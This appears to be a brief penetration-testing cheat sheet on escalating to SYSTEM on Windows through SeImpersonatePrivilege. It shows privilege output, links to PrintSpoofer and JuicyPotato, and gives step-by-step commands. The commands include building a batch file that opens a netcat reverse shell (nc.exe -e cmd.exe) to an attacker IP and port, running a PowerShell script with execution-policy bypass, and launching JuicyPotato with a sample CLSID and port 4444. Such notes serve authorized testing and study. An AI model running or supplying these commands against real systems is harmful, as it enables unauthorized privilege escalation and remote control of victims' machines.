### SeImpersonatePrivilege

whoami /all (privileges information)

SeImpersonatePrivilege = Enabled

```
Privilege Name                Description                               State   
============================= ========================================= ========
SeTcbPrivilege                Act as part of the operating system       Disabled
SeChangeNotifyPrivilege       Bypass traverse checking                  Enabled 
SeImpersonatePrivilege        Impersonate a client after authentication Enabled 
SeCreateGlobalPrivilege       Create global objects                     Enabled 
SeIncreaseWorkingSetPrivilege Increase a process working set            Disabled
```

### Privilege Escalation 1

```Windows 10``` and ```Server 2016```/```2019```/```2022```

```LOCAL SERVICE```/```NETWORK SERVICE```/```iis apppool\defaultapppool```

Tool:[PrintSpoofer](https://github.com/itm4n/PrintSpoofer)

### Privilege Escalation 2

[JuicyPotato.exe](https://github.com/ohpe/juicy-potato/releases/tag/v0.1)

```cmd
echo C:\Windows\Temp\nc.exe -e cmd.exe <attacker ip> <attacker port> > rev.bat
```

[CLSID](https://github.com/ohpe/juicy-potato/tree/master/CLSID)

```cmd
powershell -ep bypass -f "C:\Windows\Temp\GetCLSID.ps1"
REM test
test_clsid.bat
type result.log
```

```cmd
C:\Windows\Temp\juicypotato.exe -p C:\Windows\Temp\rev.bat -l <attacker port> -t * -c <CLSID>
REM -t createprocess call: <t> CreateProcessWithTokenW, <u> CreateProcessAsUser, <*> try both
REM -p <program>: program to launch
REM -l <port>: COM server listen port
REM example
C:\Windows\Temp\juicypotato.exe -p C:\Windows\Temp\rev.bat -l 4444 -t * -c {e60687f7-01a1-40aa-86ac-db1cbf673334}
```